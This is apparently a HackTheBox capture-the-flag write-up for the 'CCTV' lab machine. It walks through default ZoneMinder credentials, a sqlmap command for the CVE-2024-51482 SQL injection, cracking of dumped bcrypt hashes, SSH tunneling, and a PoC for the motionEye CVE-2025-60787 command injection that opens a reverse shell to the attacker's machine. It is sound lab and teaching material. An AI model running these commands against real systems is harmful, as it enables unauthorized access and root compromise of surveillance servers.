# CCTV – HackTheBox Writeup

**Target:** CCTV (10.129.X.X)
**Attacker:** Kali Linux
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Attack Path:** ZoneMinder Default Creds → SQL Injection (CVE-2024-51482) → Credential Dump → SSH as Mark → motionEye Command Injection (CVE-2025-60787) → Root

---

## Recon

### Port Scan

```bash
nmap -p- --min-rate 5000 -sS 10.129.X.X
```

Just two ports. SSH on 22 and HTTP on 80. The website at `cctv.htb` is a SecureVision CCTV monitoring company page. The interesting part is a "Staff Login" button that links to `http://cctv.htb/zm/`.

### Identifying ZoneMinder

That `/zm/` path is a dead giveaway. ZoneMinder is an open source video surveillance system and `/zm` is its default install path. The login page confirmed it: ZoneMinder v1.37.63.

### Default Credentials

Tried the obvious:

```
Username: admin
Password: admin
```

Worked. Full admin dashboard access. Always try default credentials before breaking out the heavy tools. Why pick the lock when the door is unlocked?

---

## Database Dump

### SQL Injection (CVE-2024-51482)

Googled `zoneminder 1.37 CVE` and found CVE-2024-51482, a time based blind SQL injection in the `tid` parameter of the removetag action. The endpoint needs an authenticated session so I grabbed my `ZMSESSID` cookie from the browser dev tools (F12 → Storage → Cookies).

Used sqlmap to dump the Users table:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  -D zm -T Users -C Username,Password --dump --batch \
  --dbms=MySQL --technique=T \
  --cookie="ZMSESSID=YOUR_SESSION_COOKIE" \
  --time-sec=2
```

Time based blind SQLi is slow because it infers data by measuring response delays. Each character takes multiple requests. But sqlmap automates the whole thing. Got three users:

```
superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

All bcrypt hashes. bcrypt is intentionally slow to crack which is why CrackStation can't look them up. Unlike the MD5 hashes from Metasploitable that cracked instantly, bcrypt generates a unique salt for every hash, so precomputed tables are useless.

### Cracking with John

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

bcrypt at cost 10 runs at about 180 attempts per second on a CPU. That's painfully slow compared to MD5's millions per second. But `mark`'s password was `opensesame` which is common enough in rockyou to fall quickly.

---

## User Access

### SSH as Mark

```bash
ssh mark@cctv.htb
# Password: opensesame
```

We're in. The home directory was mostly empty. `.bash_history` was symlinked to `/dev/null` so no command history to read. This box does something unusual though. The user flag isn't in mark's home directory. It's in `/home/sa_mark/user.txt` which only root can read. So you actually need root before you can get the user flag.

---

## Privilege Escalation

### Discovering motionEye

Checked the system services and found motionEye, another surveillance management platform:

```bash
cat /etc/systemd/system/motioneye.service
```

```
[Service]
User=root
ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
```

Running as root. That's the escalation path right there.

Read the motionEye config file:

```bash
cat /etc/motioneye/motion.conf
```

Found the admin credentials commented out in the config:

```
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

The web interface runs on port 7999 with `webcontrol_localhost on`, meaning it only accepts connections from localhost. Also found logs at `/opt/video/backups/server.log` showing a service account `sa_mark` making API calls to motionEye.

### SSH Tunnel

Since the motionEye web interface is only accessible from localhost, used SSH port forwarding to bring it to my Kali box:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

This binds port 8765 on my Kali machine and forwards everything through the SSH tunnel to port 8765 on the target's localhost. Same trick I used with Gogs on Silentium. Any time you find an internal service during enumeration, tunnel it out.

Opened `http://127.0.0.1:8765` in the browser. motionEye login page. Used the credentials from the config:

```
Username: admin
Password: 989c5a8ee87a0e9521ec81a79187d162109282f0
```

The SHA1 hash worked directly as the password. Full admin access to the motionEye dashboard.

### motionEye Command Injection (CVE-2025-60787)

Googled `motioneye 0.43.1b4 CVE` and found CVE-2025-60787. The vulnerability is in configuration fields like `image_file_name` that get written directly into the Motion config file without sanitization. When Motion reloads, it evaluates shell syntax like `$(command)` in those fields. Since motionEye runs as root, injected commands run as root.

The web UI has client side JavaScript validation that blocks shell characters. Bypassed it by opening the browser console (F12) and overriding the validation function:

```javascript
configUiValid = function() { return true; };
```

Found a PoC on GitHub that automates the whole thing:

```bash
git clone https://github.com/gunzf0x/CVE-2025-60787.git
```

Started a listener:

```bash
nc -lvnp 4444
```

Ran the exploit:

```bash
python3 CVE-2025-60787.py revshell \
  --url 'http://127.0.0.1:8765' \
  --user 'admin' \
  --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
  -i KALI_IP \
  --port 4444
```

The exploit authenticates, finds the first configured camera, injects a reverse shell payload into a config field, and triggers a reload. Shell popped.

### Root and Both Flags

```bash
whoami
# root
cat /root/root.txt
```

Root flag first. Then the user flag which was only readable as root:

```bash
cat /home/sa_mark/user.txt
```

Box pwned. Root before user on this one.

---

## Attack Chain Summary

```
nmap → HTTP on 80 → cctv.htb
→ /zm/ → ZoneMinder v1.37.63
→ Default creds admin:admin → dashboard access
→ CVE-2024-51482 (SQLi) → dumped Users table
→ bcrypt cracked → mark:opensesame
→ SSH as mark
→ motionEye service running as root on localhost:8765
→ SSH tunnel → accessed motionEye web UI
→ Admin login with hash from config file
→ CVE-2025-60787 (command injection) → root shell
→ root flag + user flag (sa_mark)
```

---

## What I Learned

Default credentials still work way too often. `admin:admin` on a surveillance system gave us the authenticated access needed for the SQL injection. Always try defaults before anything else.

bcrypt hashes are slow to crack on purpose. At 180 attempts per second on a CPU, you can't just throw rockyou at it and wait. If the password isn't in the first few thousand words, consider smarter approaches like themed wordlists or pivoting to a different attack path entirely. On this box I spent time trying to crack the hash when the ZoneMinder admin panel might have offered a faster route.

Client side validation is not security. The motionEye interface validates input with JavaScript that can be bypassed with one line in the browser console. If the server doesn't validate too, it's like locking the screen door but leaving the back window open.

SSH port forwarding is essential for internal services. motionEye was locked to localhost but one SSH command brought it to my browser. `-L local_port:target_host:target_port` is the syntax. Same trick as Silentium with Gogs on port 3001.

Config files store secrets. The motionEye admin password hash was sitting right there in `/etc/motioneye/motion.conf`. Always read config files for every service you find. And in this case the SHA1 hash worked directly as the password, no cracking needed.

Getting root before user is unusual but it happens. The user flag was in `/home/sa_mark/` which mark couldn't access. The box was designed so you had to root it first, then read the user flag. Don't assume the flags always come in order.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
